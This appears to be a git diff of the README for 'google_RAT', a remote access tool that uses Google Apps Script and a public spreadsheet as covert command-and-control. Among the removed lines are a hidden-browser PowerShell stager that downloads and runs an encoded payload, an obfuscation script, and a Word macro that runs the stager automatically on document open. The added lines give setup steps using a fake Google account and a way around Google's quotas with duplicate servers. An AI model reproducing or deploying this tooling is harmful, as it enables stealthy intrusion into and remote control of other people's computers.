@@ -1,87 +1,86 @@
-# google_RAT
-A remote access tool for Windows systems using google apps script as the middle man
+# :trollface: `google_RAT` :trollface: 
+![Version](https://img.shields.io/static/v1?label=Version&message=1.0&color=blue&style=flat-square) ![Status](https://img.shields.io/static/v1?label=Status&message=Development&color=important&style=flat-square)
 
-# Setup
+A remote access tool using [Google Apps Script](https://developers.google.com/apps-script) as the middle-man for command and control.
 
-### 1) Deploy Google Server and Spreadsheet Database
-* Create a fake Google account
-* Create a spreadsheet in the fake account's Google drive
-* Make it public:
-  * `File` > `Share...` > Give it a random name > `Get sharable link`
-* Paste the link into the `SPREADSHEET_URL` variable in `server.js`
-  * remove the `?usp=sharing` at the end of the URL. It should end in `/edit`
-* Visit [Google Scripts](https://www.google.com/script/start/) and paste the code in `server.js`
+## TODO
+
+- [ ] _Support multiple masters_. Any given HTTP POST/GET request from a master can fail due to another master or server having modified the Google Sheets database first for a specific client.
+- [ ] _Support built-in key logging for each client type_. Depending on the client type and OS platform, the ability to log user keystrokes changes.
+- [ ] _Support built-in screenshot capture for each client type_. Depending on the client type and OS platform, the ability to capture a screenshot image changes.
+- [ ] _Update C2 diagram to remove number of chunks from payload format_.
+
+## Dependencies
+
+- [Python3](https://www.python.org/downloads/)
+- [Requests](https://requests.readthedocs.io/en/master/) (`pip3 install requests`)
+
+## Command and Control Protocol Notes
+
+_NOTE:_ diagrams made with https://draw.io
+
+- **Transaction Flow:**
+
+![architecture](./docs/architecture.png)
+
+- **Client State Transition Diagram:**
+
+![state](./docs/state.png)
+
+- **General Notes:**
+
+  - This design allows for _multiple servers to be ran simultaneously_ against the same backend Google Sheets "database" for client redundancy and availability.
+
+  - All master requests to the server must present a unique key in order for their request to be processed. This key is hardcoded into each server's JavaScript with the `MASTER_KEY` variable.
+
+  - Each payload is base64 encoded _except for the the command type_. This is seperated by the `|` character as the delimiter in the payload. 
+
+
+## Setup
+
+### :one: Deploy Google Apps Script C2 Server
+
+* Create a fake Google account (https://accounts.google.com/signup)
+* Create a new empty spreadsheet in the fake account's Google Drive (https://drive.google.com)
+* Make this new spreadsheet public and openly editable by link:
+  * File > Share > Get Link > Change > Anyone with the link > Viewer > Editor
+* Paste the new spreadsheet's link into the `SPREADSHEET_URL` variable in `server.js` and define your value for `MASTER_KEY`.
+  * **NOTE:** Remove `?usp=sharing` at the end of the `SPREADSHEET_URL`. The URL should end in `/edit` only.
+* Visit Google App Scripts (https://www.google.com/script/start/) and make a new project under your new Google account:
+  * Start Scripting > New Project
+* Paste your formatted code from `server.js` and save the project
 * Publish the server:
-  * Save and name the project something
-  * `Publish` > `Deploy as web app`
+  * Publish > Deploy as web app
     * Fill in the blank with something
     * Make sure the app is executed as `Me`
     * Make sure `Anyone, even anonymous` can access the app
-  * `Review Permissions` > Select your fake account > `Advanced` > `Go to Untitled project (unsafe)` > enter 'Continue' > `Allow`
-  * Copy the URL and paste it into `$SRV` of `client.ps1`
+  * Click `Deploy`
+  * Review Permissions > Select your fake account > Advanced > Go to Untitled project (unsafe) > Allow
+  * Save the application URL. This is what the clients will connect to.
 
-### 2) Develop Powershell Payload
+### :two: Test Server Connection
 
-* Run the following powershell to compress `client.ps1`:
-```
-$s = gc <path to client.ps1>
-$x = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($s))
-$sx = [system.text.encoding]::unicode.getstring([convert]::frombase64string($x))
-$sx = $sx.replace('  ', '')
-$sx = $sx.replace(' = ', '=')
-$sx = $sx.replace(' + ', '+')
-$sx = $sx.replace(' - ', '-')
-$sx = $sx.replace(' | ', '|')
-$sx = $sx.replace('if (', 'if(')
-$sx = $sx.replace('while (', 'while(')
-$sx = $sx.replace(', ', ',')
-$sx = $sx.replace('; ', ';')
-$sx = $sx.replace('} ', '}')
-$sx = $sx.replace('{ ', '{')
-$sx = $sx.replace(' {', '{')
-write-host $sx
-```
-* Take the output and paste it into the `PAYLOAD` variable of `server.js` and republish the web server. Browse to the public google web server URL to see your payload.
+- Run `test.py` in order to test your server URL connection
 
-### 3) Embed Payload Stager into a Microsoft Document
-* Use the following powershell stager to run the payload (replace `<SRV>` with the URL of the google web server):
-```
-$i=new-object -com internetexplorer.application;
-$i.visible=$false;
-$i.silent=$true;
-$i.navigate2('<SRV>',14,0,$null,$null);
-while($i.busy -or ($i.readystate -ne 4)){sleep -seconds 1};
-$p=$i.document.lastchild.innertext;
-$i.quit();
-powershell.exe -v 2 -noE -NonI -nOpR -eNc $p;
-```
-* Use the same compression script for `client.ps1` for this payload to get the base64 encoded stager command
-* Here is an example Microsoft VBS macro used to call the previously mentioned powershell stager:
-```
-Private Sub run()
-  Dim cmd As String
-  cmd = "wmic process call create 'powershell.exe -nOpR -nonI -eNc <stager>'"
-  Set sh = CreateObject("WScript.Shell")
-  res = sh.run(cmd,0,True)
-End Sub
-Sub AutoOpen()
-  run
-End Sub
-Sub AutoExec()
-  run
-End Sub
-Sub Auto_Open()
-  run
-End Sub
-Sub Auto_Exec()
-  run
-End Sub
-```
+### :three: Select and Deploy Clients
 
-### 4) Deploying Python Shell
-**NOTE:** Script requires python 3
-* Copy the public link to the google apps server and run the following command:
-  * `python script.py <url to google apps server>`
-* Fun test commands:
-  * `(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')`
-  * `$e=new-object -com internetexplorer.application; $e.visible=$true; $e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');`
+- Select a client type from https://github.com/a-rey/google_RAT/tree/master/clients and add the URL from step 1 into the correct payload variable for your client type as defined in the client's README
+- Client deployment is up to you... but ideas can be found in your client's README
+
+### :four: Run Master
+
+- Run the master
+
+## Limitations
+
+- All data sent to/from the server is chunked into 50000 (50 KB) chunks. This is because Google Sheets currently has a single cell size limitation of 50000 characters:
+
+  ![google_sheets_limitation](./docs/google_sheets_limitation.png)
+
+- Google applies [daily quotas and limitations](https://developers.google.com/apps-script/guides/services/quotas) for execution of its services. Currently, the only impactful rules from these quotas/limitations are:
+
+  - **NOTE**: Getting around these limitations is as simple as creating other duplicate copies of the same `server.js` code for more servers in your design. Each client is able to cycle through multiple servers for loadballancing.
+
+  | Feature                 | Value |
+  | ----------------------- | ----- |
+  | Simultaneous Executions | 30    |
